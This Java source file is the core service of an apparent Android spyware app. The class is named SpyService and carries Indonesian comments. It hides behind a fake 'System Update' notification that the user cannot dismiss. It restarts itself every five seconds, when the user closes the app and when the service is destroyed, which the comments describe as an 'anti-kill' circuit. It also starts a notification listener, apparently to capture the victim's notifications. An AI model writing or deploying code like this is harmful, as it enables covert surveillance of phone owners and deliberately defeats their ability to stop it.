package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import android.app.ActivityManager;
import java.util.List;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public class SpyService extends Service {
    private static final String CHANNEL_ID = "SpyServiceChannel";
    private static final String TAG = "SpyService";
    private static final int NOTIFICATION_ID = 9999;
    
    private Handler keepAliveHandler;
    private Runnable keepAliveRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "SpyService onCreate");
        
        createNotificationChannel();
        startKeepAliveChecker();
        
        // Memasang ikon ic_launcher di samping baterai agar layanan tetap aktif
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Processing...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true) // Menjamin notifikasi tidak bisa dihapus oleh user
                .setSilent(true)
                .build();

        // Penanganan Android 14+ (API 34) untuk menghindari Force Close
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
        
        // Start NotificationListenerService
        startNotificationListener();
    }
    
    private void startKeepAliveChecker() {
        keepAliveHandler = new Handler(Looper.getMainLooper());
        keepAliveRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isServiceRunning()) {
                    Log.d(TAG, "Service not running - restarting via intent");
                    restartService();
                }
                keepAliveHandler.postDelayed(this, 5000); // Check every 5 seconds
            }
        };
        keepAliveHandler.post(keepAliveRunnable);
    }
    
    private boolean isServiceRunning() {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (SpyService.class.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    
    private void restartService() {
        Intent restartIntent = new Intent(this, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }
    
    private void startNotificationListener() {
        Intent notificationIntent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(notificationIntent);
        } else {
            startService(notificationIntent);
        }
        Log.d(TAG, "NotificationListenerService started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "SpyService onStartCommand");
        
        // Sirkuit Anti-Kill: Memaksa OS menghidupkan kembali service jika di-kill
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "Task removed - auto-restarting service");
        // Auto-restart service saat user mencoba menutup aplikasi dari Recent Apps
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartServiceIntent);
        } else {
            startService(restartServiceIntent);
        }
        
        // Also restart via RestarterReceiver
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("com.nullx.pp.ALARM_CHECK");
        broadcastIntent.setClass(this, RestarterReceiver.class);
        sendBroadcast(broadcastIntent);
        
        super.onTaskRemoved(rootIntent);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setDescription("Required for background operations");
            serviceChannel.setSound(null, null);
            serviceChannel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "SpyService onDestroy - restarting via broadcast");
        
        // Stop keep alive checker
        if (keepAliveHandler != null && keepAliveRunnable != null) {
            keepAliveHandler.removeCallbacks(keepAliveRunnable);
        }
        
        // Jalur darurat restart via RestarterReceiver jika service hancur
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("com.nullx.pp.ALARM_CHECK");
        broadcastIntent.setClass(this, RestarterReceiver.class);
        sendBroadcast(broadcastIntent);
        
        // Also try direct restart
        restartService();
        
        super.onDestroy();
    }
}